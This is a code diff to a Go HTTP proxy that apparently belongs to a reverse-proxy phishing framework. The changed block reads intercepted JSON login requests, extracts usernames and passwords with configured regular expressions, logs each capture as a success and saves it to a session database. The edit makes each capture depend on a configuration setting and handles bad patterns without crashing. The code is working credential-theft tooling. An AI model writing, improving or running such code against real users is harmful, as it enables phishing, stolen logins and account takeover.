@@ -225,27 +225,33 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 						contentType := req.Header.Get("Content-type")
 						if contentType == "application/json" {
-							
+
 							json, _ := ioutil.ReadAll(req.Body)
 							log.Debug("POST %s", json)
 
-							re := regexp.MustCompile(pl.re_username)
-							um := re.FindStringSubmatch(string(json))
-							if um != nil && len(um) > 1 {
-								p.setSessionUsername(ps.SessionId, um[1])
-								log.Success("[%d] Username: [%s]", ps.Index, um[1])
-								if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
-									log.Error("database: %v", err)
+							if pl.k_username == "json" {
+								if re, err := regexp.Compile(pl.re_username); err == nil {
+									um := re.FindStringSubmatch(string(json))
+									if um != nil && len(um) > 1 {
+										p.setSessionUsername(ps.SessionId, um[1])
+										log.Success("[%d] Username: [%s]", ps.Index, um[1])
+										if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
+											log.Error("database: %v", err)
+										}
+									}
 								}
 							}
 
-							re = regexp.MustCompile(pl.re_password)
-							pm := re.FindStringSubmatch(string(json))
-							if pm != nil && len(pm) > 1 {
-								p.setSessionPassword(ps.SessionId, pm[1])
-								log.Success("[%d] Password: [%s]", ps.Index, pm[1])
-								if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
-									log.Error("database: %v", err)
+							if pl.k_password == "json" {
+								if re, err := regexp.Compile(pl.re_password); err == nil {
+									pm := re.FindStringSubmatch(string(json))
+									if pm != nil && len(pm) > 1 {
+										p.setSessionPassword(ps.SessionId, pm[1])
+										log.Success("[%d] Password: [%s]", ps.Index, pm[1])
+										if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
+											log.Error("database: %v", err)
+										}
+									}
 								}
 							}
 
